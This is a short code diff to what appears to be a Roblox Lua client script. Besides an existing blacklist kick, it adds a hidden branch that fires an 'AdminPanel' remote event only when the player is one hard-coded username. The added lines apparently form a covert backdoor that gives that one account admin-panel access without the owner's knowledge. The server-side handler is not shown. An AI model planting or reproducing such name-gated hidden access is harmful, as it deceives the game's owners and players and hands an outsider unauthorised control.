@@ -9,3 +9,9 @@ local plr = game.Players.LocalPlayer
 if plr.Name == "iiDemon_Bear6" then
 game.Players.LocalPlayer:Kick("Estas en la lista negra")
 end
+
+local plr = game.Players.LocalPlayer
+
+if plr.Name == "Rsagagsad" then
+game:GetService("ReplicatedStorage").AdminPanel:FireServer()
+end
